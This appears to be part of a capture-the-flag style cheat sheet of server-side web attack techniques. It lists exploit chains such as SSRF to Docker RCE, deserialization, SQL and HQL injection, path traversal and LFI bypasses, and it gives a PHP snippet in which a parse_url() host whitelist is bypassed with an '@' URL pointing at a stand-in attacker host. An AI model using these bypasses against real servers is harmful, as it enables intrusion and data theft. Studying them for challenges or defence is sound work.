# Benchmark Web - Advanced Server-Side Techniques (Part 2)

## Table of Contents
- [SSRF to Docker API RCE Chain](#ssrf-to-docker-api-rce-chain)
- [Castor XML Deserialization via xsi:type Polymorphism](castor-xml-deserialization-via-xsitype-polymorphism)
...
- [HQL Injection via Non-Breaking Space](#hql-injection-via-non-breaking-space)
- [Base64-Encoded Path Traversal](#base64-encoded-path-traversal)
- [Windows 8.3 Short Filename Path Traversal Bypass](#windows-83-short-filename-path-traversal-bypass)
- [URL parse_url() @ Symbol Bypass](#url-parse_url--symbol-bypass)
- [PHP zip:// Wrapper LFI via PNG/ZIP Polyglot](#php-zip-wrapper-lfi-via-pngzip-polyglot)
- [XSS to SSTI Chain via Flask Error Pages](#xss-to-ssti-chain-via-flask-error-pages)
- [INSERT INTO Dual-Field SQLi Column Shift](#insert-into-dual-field-sqli-column-shift)
- [Session Cookie Forgery via Timestamp-Seeded PRNG](#session-cookie-forgery-via-timestamp-seeded-prng)
- [SSRF via parse_url/curl URL Parsing Discrepancy](#ssrf-via-parse_urlcurl-url-parsing-discrepancy)
- [LaTeX RCE via mpost Restricted write18 Bypass](#latex-rce-via-mpost-restricted-write18-bypass)
- [ElasticSearch Groovy script_fields RCE via SSRF](#elasticsearch-groovy-script_fields-rce-via-ssrf)
- [Rogue MySQL Server LOAD DATA LOCAL File Read](#rogue-mysql-server-load-data-local-file-read)
...
```php
// Server validates URL host must be challenge.example.com
// parse_url("http://attacker.com@challenge.example.com/")
//   -> host: challenge.example.com (passes validation)

// But wget/curl follow RFC and connect to attacker.com:
// wget "http://attacker.com@challenge.example.com/"
//   -> Actually connects to: attacker.com

// Exploit for URL shortener/fetcher:
$url = "http://{$attacker_ip}@challenge.example.org/?";
// parse_url() sees host = challenge.example.org (passes whitelist)
